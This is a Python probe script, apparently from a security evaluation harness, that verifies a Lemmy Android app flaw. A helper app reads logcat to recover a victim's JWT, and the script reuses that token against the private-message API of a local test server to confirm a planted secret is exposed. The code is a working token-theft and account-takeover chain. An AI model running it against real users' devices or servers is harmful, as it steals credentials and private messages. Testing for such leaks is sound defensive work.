#!/usr/bin/env python3
"""
Probe: Jerboa — confidentiality (malicious_app).
Isolated entry point for consolidated evaluation engine.
"""

from __future__ import annotations

import json
import os
import sys
import uuid
from pathlib import Path


def _load_and_run():
    parent = Path(__file__).resolve().parent.parent
    if str(parent) not in sys.path:
        sys.path.insert(0, str(parent))

    from jerboa_probe_utils import (
        get_victim_jwt_from_db,
        run_helper_reproduction,
    )

    impact, summary = False, {"score": 1, "vectors": {}}
    victim_jwt = get_victim_jwt_from_db()
    if not victim_jwt:
        print(json.dumps(summary))
        return 1

    expected_secret = json.loads((parent / "secrets.json").read_text()).get(
        "alice_dm_secret", ""
    )

    # V-002: Logcat token leakage with post-exploit API access
    # The malicious-app path is app-level: the helper APK itself reads logcat
    # and returns the exact log line that contains the victim JWT.
    ipc_ok, log_line = run_helper_reproduction(
        mode="read_logs",
        logcat_tag="LemmyAPI",
        logcat_pattern=victim_jwt,
        run_id=uuid.uuid4().hex,
    )
    if ipc_ok and log_line:
        try:
            import requests

            jwt_match = None
            for line in reversed(log_line.splitlines()):
                if victim_jwt not in line or "Bearer " not in line:
                    continue
                jwt_match = line.split("Bearer ", 1)[1].split()[0].strip("\"'")
                break
            if jwt_match:
                base_url = os.getenv("LEMMY_URL", "https://localhost:8536")
                response = requests.get(
                    f"{base_url}/api/v3/private_message/list",
                    params={"type_": "All", "limit": 20},
                    headers={"Authorization": f"Bearer {jwt_match}"},
                    timeout=10,
                )
                if response.status_code == 200:
                    payload = response.json()
                    for pm in payload.get("private_messages", []):
                        message = pm.get("private_message", {}).get("content", "")
                        if expected_secret and expected_secret in message:
                            impact = summary["vectors"]["V-002"] = True
                            break
        except Exception:
            pass

    summary["score"] = 0 if impact else 1
    print(json.dumps(summary))
    return 0 if impact else 1


if __name__ == "__main__":
    sys.exit(_load_and_run())
